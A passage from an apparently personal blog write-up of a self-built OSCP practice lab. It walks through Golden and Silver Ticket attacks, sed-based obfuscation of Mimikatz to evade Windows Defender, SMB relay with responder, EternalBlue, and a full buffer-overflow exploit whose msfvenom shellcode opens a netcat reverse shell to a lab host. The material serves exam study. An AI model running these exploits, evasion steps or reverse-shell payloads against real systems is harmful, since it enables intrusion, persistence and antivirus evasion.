![](/assets/img/OSCP/51.png)

Awsome.

#### Method 2
---

In this method we aren't going to create a `.kirbi` file. Instead, we are going to create a `.ccache` file, which will allow us to get a **permanent persistence** on the **Domain Controller**! In my **Active Directory** notes I've explained how to use `ticketer`, but I don't mind to explain it again.

```zsh
❯ impacket-ticketer -nthash 7c96fa8a3ae9ca43564d5453a27e7f18 -domain-sid S-1-5-21-2575778808-3512245514-2536450312 -domain paif.local Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for paif.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Here we are using again the data we've obtained with `mimikatz`: 

- NTLM hash
- **krbtgt** account SID

In the output of the program we can see that the **TGT** ticket has been saved on a file `.ccache`; well, this kind of files can be exported in a **system variable** called **KRB5CCNAME** so later can be used to connect **without password** to the **Domain Controller**:

![](/assets/img/OSCP/48.png)

If everything goes well, we should be able to connect to the domain controller without providing password, but before we need to set up some things; We need to edit the `/etc/krb5.conf` file so it looks something like this:

![](/assets/img/OSCP/50.png)

Now, we can login into the Domain Controller **without providing any password**!!!:

```zsh
❯ psexec.py -k -n paif.local/Administrator@DC-Company cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.0.124.....
[*] Found writable share ADMIN$
[*] Uploading file dXMWxiNi.exe
[*] Opening SVCManager on 192.168.0.124.....
[*] Creating service lUuS on 192.168.0.124.....
[*] Starting service lUuS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

This will allow us to connect even the **Administrator's** password changes, because this is not a ticket generated with the **NTML** hash, is being created by **Kerberos**, by the **KRBTGT** account. This is a very good way to **establish a permanent persistence** on the **Domain Controller**.

>If we know the password, we could also use `impacket`, but this time with the `getTGT` utility:
{: .prompt-tip }

![](/assets/img/OSCP/52.png)

And this can get cooler, we don't need **Administrator's** password:

![](/assets/img/OSCP/53.png)

We still getting **NT AUTHORITY\SYSTEM** account!

## Mimikatz Obfuscator
---

If you are a normal user, maybe the Anti-Virus is your friend, but we are not normal users, right? So, I want to make sure this is clear: **Anti-Virus is our enemy**. And there are sometimes that this little guy can be very annoying, particularly in the **post-exploitation** fase. Imagine that we've gained access to the **Domain Controller**, and we want to perform a **Golden Ticket** attack; well, if we try to run the usual `mimikatz`, the **Windows Defender** will popup. How can we avoid this? Simple, by **obfuscating the binary**. This can be perfomed with a tool created by **Daniel Bohannon**, [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). For this type of attack, we will 'encode' the **Invoke-Mimikatz.ps1** file so the **Windows Defender** can't detect it. The idea is to **'obfusc'** this file so, as I said before, **Windows Defender** can't stop it.

Obfuscating the **Invoke-Mimikatz.ps1** file:

```zsh
❯ sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
❯ sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
❯ sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
❯ sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
❯ sed -i -e 's/ArgumentPtr/BirdIsTheWord/g' Invoke-Mimikatz.ps1
❯ sed -i -e 's/CallDllMainSC1/UnceUnceUnce/g' Invoke-Mimikatz.ps1
❯ sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
```

Once the obfuscation is done, we must transfer the whole **Invoke-Obfuscation** repository into the **Domain Controllers**:

![](/assets/img/OSCP/77.png)

When this is done, we need to import the modules:

![](/assets/img/OSCP/78.png)

By running `Invoke-Obfuscation` we can get the main panel of this tool:

![](/assets/img/OSCP/79.png)

Now we are going to input **SCRIPTBLOCK**, which is the **PowerShell** command we want to execute:

![](/assets/img/OSCP/80.png)

Once this is completed successfully, we can execute **ENCODING**, which is the option to **obfuscate** the command:

![](/assets/img/OSCP/81.png)

Here we are selecting the fifth option, which is the **SecureString** (AES) encryption. The next step is to open a new **PowerShell** and verify that is **Unrestricted**:

![](/assets/img/OSCP/82.png)

Then, we must copy the result of **Invoke-Obfuscation** so its a one-line payload. But, before that, we need to execute the following command, which will trust in **all HTTPS** requests: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;`. Once that is complete, we need to copy the **resul** of **Invoke-Obfuscation** and execute it:

![](/assets/img/OSCP/83.png)

Great!! We've successfully loaded `mimikatz` into memory, and with this we've bypassed the **Anti-Virus**!! 

### Silver Ticket
---

![](/assets/img/OSCP/47.png)

---

The difference between the **Golden Ticket** and **Silver Ticket** is that the **Golden Ticket** creates a **TGT** (Ticket Granting Ticket), which does not deppends on the user's password; instead, the **Silver Ticket** creates a **TGS** (Ticket Granting Service), which **depends on the password hash**. For this kind of attack we are going to use again the tool `mimikatz`, but we are also going to use the tool `PsExec.exe` to gain a shell.

![](/assets/img/OSCP/54.png)

Here we can see that we are attacking the service **CIFS** (Common Internet File System), which is a **printing and sharing** protocol in a local network. We can now perform a **Pass The Ticket** attack, as we did on **Golden Ticket**:

![](/assets/img/OSCP/55.png)

Now by executing **PsExec** against the target (paif.local) we should obtain a shell:

```zsh
PS C:\Users\vcano\Documents> ./psexec.exe \\paif.local powershell -accepteula
./psexec.exe \\paif.local cmd -accepteula

PsExec v2.42 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Starting cmd on paif.local...e on paif.local...
Microsoft Windows [Version 10.0.17763.3650]cmd exited on paif.local with error code 0.
PS C:\Users\Administrator\Documents> whoami
whoami
paif\administrator
PS C:\Users\Administrator\Documents> 
```

# Pwning SROMERO-PC
---

![](/assets/img/OSCP/3.png)

---

In the most of companies networks, there are automated tasks such as applications updates, database updates, Anti-Virus updates, etc. These connections are mostly performed by the network protocol **SMB**. In my **Active Directory** notes, I've shown that if a computer is trying to connect to a non-existing resource, we could poison the network so when this resource is not available, our tool `responder` will say: **"Hey! I am the resource you're trying to access! Authenticate against me!"**, so because the **SMB** is not signed, the computer is not able to check the legetimity of the resource, so it'll say: **"What the hell, let's authenticate, if anything goes wrong, I don't care"**. This kind of attack is called **SMB Relay**, and it must be performed on a **local network**. Let's practice.

## SMB Relay
---

As I've explained above, there some automated tasks on companies. Spoiler, here there is one:

![](/assets/img/OSCP/57.png)

As we can see in this screenshot, this program is trying to access the network resource **SQL_Server\database.json**. Because there is not any computer connected to the network that have that hostname, the program is outputting **The network resource can't be reached**. We can take advantage of this and fire up our `responder`, so every five minutes we'll get a **NTLM** hash of the user **sromero**, in this case:

![](/assets/img/OSCP/58.png)

If the password is weak, we could try to crack it with the wordlist **rockyou**:

![](/assets/img/OSCP/59.png)

And great! We are able to crack this password. By checking the **SROMERO-PC's** IP address, we can see that corresponds to **192.168.0.125**. We can do this with `crackmapexec`, although.

![](/assets/img/OSCP/60.png)

![](/assets/img/OSCP/61.png)

We know the password and the username, right? Well, we can just connect to the machine!

![](/assets/img/OSCP/62.png)

Great! Well, we are **NT AUTHORITY\SYSTEM** account because this user (**sromero**) may be on the **Administrators** group:

![](/assets/img/OSCP/63.png)

# Pwning VCANO-PC
---

![](/assets/img/OSCP/3.png)

---

In companies, there are users that have privileges over other users. This can be explained because, maybe, the boss of the company has privileges over an usual employee. Let's imagin that the user **sromero** is the boss and that **vcano** is the employee; well, we can check the privileges with `crackmapexec`:

![](/assets/img/OSCP/64.png)

If you anytime execute `crackmapexec` with any credentials and you see **Pwn3d!** on a computer, means that the used user has **Administrator** privileges over the named computer. If we try to connect to the computer as **sromero**, we'll successfully access to the computer:

![](/assets/img/OSCP/65.png)

We could also pwn this computer with the **Golden Ticket** attack, but it would be exactly the same as we did on the **Domain Controller**, so I don't think its neccessary to explain it again. 
This is happening, again, because the user **sromero** is on **Administrators** group of the **VCANO-PC**:

![](/assets/img/OSCP/66.png)

# Extra: EternalBlue (MS17-010)
---

This vulnerability made history in hacking. I hope you heard about it, because is one of the most **dangerous** and **famous** in hacking. This vulnerability was released in **14th March 2017**, but it was used by the famous **ransomware**, [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack). This vulnerability takes advantage of the **SMB** protocol on **Windows** systems; this also affects to the following versions of **Windows**:

- Windows Vista
- Windows 7
- Windows 8.1
- Windows Server 2008
- Windows Server 2008 R2
- Windows Server 2012
- Windows Server 2012 R2
- Windows 10 (up to version 1703)
- Windows Server 2016 (up to version 1709)

>I've added this machine to the lab when I was finishing it, just because the lab was pretty short. Even that, I've added how to make it vulnerable to this attack up in the post.
{: .prompt-warning }

Because this vulnerability applies to port **445** (SMB Service), we will first need to make sure that this port is exposed on the target machine, in this case, **CCrespo-PC**:

![](/assets/img/OSCP/92.png)

Here we can see that `nmap` is saying **"Hey, this guy is vulnerable"**. So, to exploit this vulnerability there are **several** ways. I am going to explain **two** of them.

## Metasploit
---

I kinda don't like to use this tool because you really don't know what is happening behind everything, but I have to admit that for this specific vulnerability, that is based on a complex **Buffer Overflow** (BoF), its pretty useful, specifically if you need to be **fast**. 
We'll start my opening the **metasploit framework**, `msfconsole`. Then, we'll search for **MS17-010** and we must select the first one:

![](/assets/img/OSCP/93.png)

Perfect! By executing `show options` we can see which are the things wee need to provide to the exploit:

![](/assets/img/OSCP/94.png)

Ok, so it seems like we only need to provide the **IP** address! With `set RHOSTS` we can enter the target's **IP** address:

![](/assets/img/OSCP/95.png)

Great! Here we can see that we've gained a **shell** as the **NT AUTHORITY\SYSTEM** account. Here we can see that this computer is connected to the **paif.local** domain:

![](/assets/img/OSCP/96.png)

## AutoBlue
---

This is kind the same as we did with the `metasploit` tool. The unique diference is that we are using a tool called [AutoBlue](https://github.com/worawit/MS17-010). I remember you that we've already used this tool in the **eCPPTv2** simulation exam. 
The first thing you must do is to **clone** the **repo** and then execute the `zzz_exploit.py`, which give use a **semi-interactive** shell, but first we must create an **SMB** server in which we'll be sharing the binary **nc.exe**. After that, we need to edit the command to execute in the **python exploit**:

![](/assets/img/OSCP/97.png)

And if we run the **exploit**...

![](/assets/img/OSCP/98.png)

We get the same result!

# Extra: Pwning DSimion-PC
--- 

![](/assets/img/OSCP/109.png)

---

I was pretty bored, with this lab, and I felt like something was missing. In the older **OSCP** exam, there were sometimes when you had to exploit a binary, so this is pretty intuitive, a **Buffer Overflow**. I really like this type of attack, so I decided to create a **Debian x86** machine. This machine will run a binary from the [IMF](https://www.vulnhub.com/entry/imf-1,162/) machine from the **VulnHub** platform. [Here](https://drive.google.com/file/d/1UF9LhY-W-jDCp4HBH-p1nM3vmue5hVp8/view?usp=sharing) is a link to download the binary only and not the entire machine. You only need to download the binary and put it on the **Debian** machine. I don't want to this post last forever so the enumeration part I am going to do it pretty fast.

## Enumeration
---

### Nmap
---

We are going to start the `nmap` scan to see the opened ports:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.139 -oN allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 16:40 CEST
Initiating ARP Ping Scan at 16:40
Scanning 192.168.0.139 [1 port]
Completed ARP Ping Scan at 16:40, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:40
Scanning 192.168.0.139 [65535 ports]
Discovered open port 80/tcp on 192.168.0.139
Discovered open port 22/tcp on 192.168.0.139
Completed SYN Stealth Scan at 16:40, 2.66s elapsed (65535 total ports)
Nmap scan report for 192.168.0.139
Host is up, received arp-response (0.011s latency).
Scanned at 2023-06-21 16:40:18 CEST for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:CC:49:CE (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.89 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65580 (2.625MB)
```

Here we can see the usual ports of a **Linux** machine. If we check the web we can see that is the default **Apache** website, but in the source code of the web we can see a courious string:

![](/assets/img/OSCP/107.png)

This string seems to be credentials! If we try to connect to **SSH** (Secure Shell) we can notice that these are system-valid credentials!

![](/assets/img/OSCP/108.png)

## Privilege Escalation (Buffer Overflow)
---

>To successfully exploit the **BoF** you must run the following command so the `agent` binary get executed on the port **7788** `socat TCP-LISTEN:7788,fork EXEC:/home/dsimion/agent`
{: .prompt-warning }

In the same folder as the **user** flag we can notice a binary with **SUID** permissions! The first thing we must do is to bring it to our **attacker** machine. After that we must start the **Debugging** process:

![](/assets/img/OSCP/110.png)

We can see that its asking for an **ID**, but we don't have that info. There are tools as `ltrace` which allows us to see with which string is comparing our input. If we run the binary with `ltrace` we are able to read the **ID**:

![](/assets/img/OSCP/111.png)

We can check if this **ID** is valid by inputting into the program, and we'll notice that the program is asking for a second input! We can notice also that the program is opening the port **7788**, so we'll need to know that when we try to access the machine.

![](/assets/img/OSCP/112.png)

Ok, so it doesn't seem to be here where we need to exploit the **BoF**, but after searching for the vulnerable input fields we can notice that the third parameter seems to be the one:

![](/assets/img/OSCP/113.png)

Nice! So the program is crashing! We can notice that the **EIP** register has now a value of **0x41414141**. This is because **AAAA** in hexadecimal is equal to **0x414141**. But, why we can overwrite these registers? This is because with our **As** we've overwritten the memory registers such as **EIP**, **ESP** or **EAX**:

![](/assets/img/buffemr/17.png)

![](/assets/img/buffemr/18.png)

One thing we must do in **all** binaries that seem to be vulnerable to **BoF** is to check their protections. We can achieve this using `checksec`:

![](/assets/img/OSCP/114.png)

Here we can see that the **NX** (Non Execution) protection is disabled, so this would allow us to apply a jump to the **ESP** or the **EAX** register:

![](/assets/img/OSCP/115.png)
<small>Made by GatoGamer1155</small>

Our **input** is being stored on the **EAX** register, so when we call to the **EAX** register, with **call eax** which is a memory direction, **EAX** will be storing our **shellcode**, so this will be executed. So, the order of our payload would be something like this:

- Payload
- Junk until we reach **EIP**
- In **EIP** we must input the memory direction of **EAX**

Now, in order to exploit the **BoF** we first need to know the number of **junk bytes** before we start overwriting the **EIP**. We can easily perform this with `pattern create` and the `pattern offset $eip`:

![](/assets/img/OSCP/116.png)

It seems like the number of **junk bytes** is **168**. Well, with this information we can start developing our exploit to exploit it **LOCALLY**:

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *

# Variables
offset = 168 # Replace to the binary's offset size

shellcode = b""
shellcode += asm(shellcraft.i386.sh())
```

In this first lines of the **exploit** we are importing the **pwntools** library, then defining the **offset** variable which contains the number of **junk bytes**, then the **shellcode**, which is the instruction `/bin/sh -p`.

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *

# Variables
offset = 168 # Replace to the binary's offset size
before_eip = b"A" * (offset - len(shellcode))

shellcode = b""
shellcode += asm(shellcraft.i386.sh())
```

Here in the variable **before_eip** we are saying **"Hey, input 168 As but after that substract to the offset the length of the shellcode"**. After this we must find the **call eax** memory direction so we can input that memory direction to the **EIP**. To achieve this we are going to use `nasm shell` and `objdump`:

![](/assets/img/OSCP/117.png)

Ok, so now we are going to define the **eip** variable, in which we are going to use the **pwntools** library to put the memory direction in **little endian**:

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *

# Variables
offset = 168 # Replace to the binary's offset size

# ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > call eax
# 00000000  FFD0              call eax
# nasm > 
#
# -------------------------------------------------------------  
# ❯ objdump -D agent | grep "ff d0"
# 8048563:      ff d0                   call   *%eax

eip = p32(0x8048563)

shellcode = b""
shellcode += asm(shellcraft.i386.sh())

before_eip = b"A" * (offset - len(shellcode))
```

Now we need to define the **payload** variable in which we'll store the order of what we want to input. As I said earlier with the help of the scheme of **GatoGamer1155**, the order would be like this:

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *

# Variables
offset = 168 # Replace to the binary's offset size

# ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > call eax
# 00000000  FFD0              call eax
# nasm > 
#
# -------------------------------------------------------------  
# ❯ objdump -D agent | grep "ff d0"
# 8048563:      ff d0                   call   *%eax

eip = p32(0x8048563)

shellcode = b""
shellcode += asm(shellcraft.i386.sh())

before_eip = b"A" * (offset - len(shellcode))

payload = shellcode + before_eip + eip
```

We are going to use again the library **pwntools** so we can define `shell` as a process, but we also need to think that the vulnerable input is the **third** one after inputting the **ID**, so we need to keep that in mind too. We also need to think on when we press **Enter**. We'll represent that with `b"\n"`.

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *

# Variables
offset = 168 # Replace to the binary's offset size

# ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > call eax
# 00000000  FFD0              call eax
# nasm > 
#
# -------------------------------------------------------------  
# ❯ objdump -D agent | grep "ff d0"
# 8048563:      ff d0                   call   *%eax

eip = p32(0x8048563)

shellcode = b""
shellcode += asm(shellcraft.i386.sh())

before_eip = b"A" * (offset - len(shellcode))

payload = shellcode + before_eip + eip

shell = process('./agent')
shell.sendline(b"48093572") # Agent ID
shell.sendline(b"3\\n") # Select third option + Enter
shell.sendline(b"\n") # Enter
shell.sendline(payload + b"\n") # Send the payload + Enter
shell.interactive() # Makes the process interactive 
```

If we've done well our exploit, it should work perfectly. After fighting a while with the exploit I found the error

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *
import socket

# Variables
offset = 168 # Replace to the binary's offset size

shellcode =  b""
shellcode += b"\xbf\x8e\x4e\x92\xa5\xdb\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x31\x7d\x12\x03\x7d\x12"
shellcode += b"\x83\x63\xb2\x70\x50\x4a\x90\x82\x78\xff\x65"
shellcode += b"\x3e\x15\xfd\xe0\x21\x59\x67\x3e\x21\x09\x3e"
shellcode += b"\x70\x1d\xe3\x40\x39\x1b\x02\x28\x7a\x73\xf4"
shellcode += b"\xc7\x12\x86\xf5\x16\x58\x0f\x14\xa8\xf8\x40"
shellcode += b"\x86\x9b\xb7\x62\xa1\xfa\x75\xe4\xe3\x94\xeb"
shellcode += b"\xca\x70\x0c\x9c\x3b\x58\xae\x35\xcd\x45\x7c"
shellcode += b"\x95\x44\x68\x30\x12\x9a\xeb"

before_eip = b"A" * (offset - len(shellcode))

# ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > call eax
# 00000000  FFD0              call eax
# nasm >
#
# -------------------------------------------------------------
# ❯ objdump -D agent | grep "ff d0"
# 8048563:      ff d0                   call   *%eax

eip = p32(0x8048563)

payload = shellcode + before_eip + eip

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create main variable for connection
shell.connect(("192.168.0.139", 7788)) # Host and port
shell.send(b"48093572\n") # Sends the ID and hit enter
shell.send(b"3\n") # Select the third option and hit enter
shell.send(payload + b"\n")
```

![](/assets/img/OSCP/118.png)

Ok, so now the idea is to change the **shellcode** so the instruction is not `/bin/sh -p`, is `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.111 443 >/tmp/f`. As always, we are going to perform this with `msfvenom`, because if we try to create a **shellcode** from zero, I can guarantee you that you won't sleep. 

```zsh
❯ msfvenom -p linux/x86/exec CMD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.111 443 >/tmp/f" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 115 bytes
Final size of py file: 664 bytes
shellcode =  b""
shellcode += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7"
shellcode += b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x52\xe8\x50\x00\x00\x00\x72\x6d\x20\x2f"
shellcode += b"\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66"
shellcode += b"\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61"
shellcode += b"\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e"
shellcode += b"\x26\x31\x7c\x6e\x63\x20\x31\x39\x32\x2e\x31"
shellcode += b"\x36\x38\x2e\x30\x2e\x31\x31\x31\x20\x34\x34"
shellcode += b"\x33\x20\x3e\x2f\x74\x6d\x70\x2f\x66\x00\x57"
shellcode += b"\x53\x89\xe1\xcd\x80"
```

After completing this we just need to change some things in our **exploit**. I think that for the connections is easier to use **socat**, so this is how our exploit should look like:

```python
#!/usr/bin/python3
# By ruycr4ft

from pwn import *
import socket

# Variables
offset = 168 # Replace to the binary's offset size

shellcode =  b""
shellcode += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7"
shellcode += b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x52\xe8\x50\x00\x00\x00\x72\x6d\x20\x2f"
shellcode += b"\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66"
shellcode += b"\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61"
shellcode += b"\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e"
shellcode += b"\x26\x31\x7c\x6e\x63\x20\x31\x39\x32\x2e\x31"
shellcode += b"\x36\x38\x2e\x30\x2e\x31\x31\x31\x20\x34\x34"
shellcode += b"\x33\x20\x3e\x2f\x74\x6d\x70\x2f\x66\x00\x57"
shellcode += b"\x53\x89\xe1\xcd\x80"

before_eip = b"A" * (offset - len(shellcode))

# ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > call eax
# 00000000  FFD0              call eax
# nasm >
#
# -------------------------------------------------------------
# ❯ objdump -D agent | grep "ff d0"
# 8048563:      ff d0                   call   *%eax

eip = p32(0x8048563)

payload = shellcode + before_eip + eip

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create main variable for connection
shell.connect(("192.168.0.139", 7788)) # Host and port
shell.send(b"48093572\n") # Sends the ID and hit enter
shell.send(b"3\n") # Select the third option and hit enter
shell.send(payload + b"\n")
```

As you can see change from **pwntools** to **socket** is not that hard. If everything is ok, we should get a **reverse shell** on the port **443**:

![](/assets/img/OSCP/119.png)

Great! Because the binary `agent` has **SUID** permissions, we get the shell as the user **root**!
I'd like to give thanks to **MsBlank** and **GatoGamer1155** for helping me in this **BoF** part, in which I had a few problems. Thanks guys. 

# Conclusions
---

The **OSCP** certification is a hard one, but not impossible. As I said at the very beginning of this post, I am not certified of it, but I am studying for it. My opinion is that you need to control **a lot** all the attacks of **Active Directory**, and of course some basics of **Linux** and **Windows** privilege escalation. The **Buffer Overflow** has been retired from this cert but even though I highly recommend to controle it well. If you are planning to do the exam soon, I really hope you pass it. I think that the key to pass it is to not get stuck on a specific point. If you don't find anything, go to the next machine but never get stuck for a long time. Another thing to remember is to take a break of 5 minutes every hour, so your brain doesn't burnout. Good luck! 